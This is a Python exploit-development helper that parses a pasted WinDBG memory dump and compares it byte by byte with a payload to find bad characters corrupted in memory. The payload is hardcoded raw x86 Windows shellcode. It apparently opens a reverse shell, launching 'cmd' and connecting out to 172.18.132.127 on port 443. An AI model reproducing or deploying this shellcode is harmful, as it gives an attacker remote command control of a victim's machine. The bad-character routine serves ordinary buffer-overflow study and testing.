#!/usr/bin/python
import sys

print("Put a raw payload bytes in variable in source code")
print("Paste WHOLE memory dump from WinDBG command (Also with linebreaks from for example (dd 00faf25a l50)):")
print("To proceed after that paste press CTRL+D or CTRL+C")
memory_matrix = []
while True:
    try:
        line = input()
    except EOFError:
        break
    except KeyboardInterrupt:
        break
    memory_matrix.append(line)

shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shellcode += b"\x6a\x05\x68\xac\x12\x84\x7f\x68\x02\x00\x01"
shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a"
shellcode += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
shellcode += b"\x6a\x00\x53\xff\xd5"

payload = shellcode

# remove memory addresses
buff_memory = []
for line in memory_matrix:
  try:
    list_of_dwords = line.split('  ')[1].split(' ')
  except IndexError:
    pass

  for dword in list_of_dwords:
    list_of_bytes_in_dword = [dword[i:i+2] for i in range(0, len(dword), 2)]
    list_of_bytes_in_dword.reverse()
    for _byte in list_of_bytes_in_dword:
      buff_memory.append(_byte)


# Remove trailing C
i=0
while True:
  if buff_memory[i] != '43':
    # end of C
    break
  i+=1
if i != 0:
  buff_memory = buff_memory[i:]

bad_chars = []
memory_counter=0
break_counter=0
for i in range(len(payload)):
  _byte = f'{payload[i]:0{2}x}'.upper()
  # print(_byte, "==", buff_memory[i-memory_counter].upper(), " ", _byte == buff_memory[i-memory_counter].upper())
  if _byte == buff_memory[i-memory_counter].upper():
    break_counter=0
  else:
    # add new bad char detected 
    bad_chars.append(_byte)
    memory_counter+=1
    break_counter+=1
  
  if break_counter>3:
    print("Too much differences, stopping.")
    break

  if buff_memory[i-memory_counter].upper() == "FF":
    print("Finito: ")
print(bad_chars)
# print(buff_memory)